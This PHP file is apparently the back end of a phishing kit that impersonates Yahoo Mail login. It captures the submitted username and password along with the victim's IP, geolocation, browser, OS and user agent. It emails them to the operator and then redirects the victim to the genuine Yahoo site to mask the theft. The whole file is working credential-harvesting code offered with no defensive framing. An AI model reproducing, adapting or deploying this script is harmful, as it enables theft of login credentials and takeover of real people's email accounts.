<?php

session_start();

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

require_once '../../mail.php';
require_once '../geo.php';
require_once '../sync.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

$_SESSION["us"] = $us = $_POST["username"];
$_SESSION["ps"] = $ps = $_POST["password"];
$path = base64_encode($us);

$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$us."\n";
$message .= "Password: ".$ps."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "You've got mail from $ip ($cn)";
$headers = "From: GOC $cc <noreply>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($us) || empty($ps)) {
header("Location: ./?src=ym&lang=en-US&done=https%3A%2F%2Fmail.yahoo.com%2F&authMechanism=tetiary&display=login&acrumb=$path&sessionIndex=QQ--");
}
else {
mail($to,$subject,$message,$headers);
header("Location: https://login.yahoo.com/account/challenge/session-expired?display=login&.src=ym&done=https%3A%2F%2Fmail.yahoo.com%2F&prefill=0&chllngnm=base&authMechanism=primary&acrumb=$path");

}

?>